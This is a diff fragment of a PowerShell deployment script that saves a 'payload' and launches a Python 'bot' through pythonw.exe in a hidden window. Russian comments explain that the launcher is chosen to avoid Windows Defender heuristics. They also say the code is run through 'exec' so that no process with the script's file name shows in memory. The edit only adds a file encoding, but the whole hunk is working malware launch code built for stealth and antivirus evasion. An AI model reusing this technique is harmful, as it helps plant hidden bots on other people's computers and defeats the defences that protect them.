@@ -53,7 +53,7 @@ Log "Payload saved: $botPath"
 
 # Запуск через pythonw.exe (не RuntimeBroker — Defender бьёт хуристикой)
 # exec через -c чтобы не было .py процесса в памяти с именем файла
-$args = "-W ignore -c `"exec(open(r'$botPath').read())`""
+$args = "-W ignore -c `"exec(open(r'$botPath', encoding='utf-8').read())`""
 Start-Process -FilePath $pyw -ArgumentList $args -WindowStyle Hidden
 Log "Bot launched via pythonw.exe -c exec(open(dat).read())"
 Log "=== deploy done ==="
